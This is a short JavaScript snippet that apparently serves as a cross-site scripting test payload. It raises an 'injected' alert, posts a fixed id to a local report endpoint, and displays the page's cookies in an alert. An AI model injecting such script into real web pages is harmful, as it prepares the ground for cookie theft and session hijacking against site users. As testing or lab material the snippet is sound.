alert("injected");

fetch("127.0.0.1:3000/report", {
  method: "POST",
  body: JSON.stringify({
    id: 1
  }),
  headers:{
    "Content-Type": "application/x-www-form-urlencoded"
  }
});

alert(document.cookie);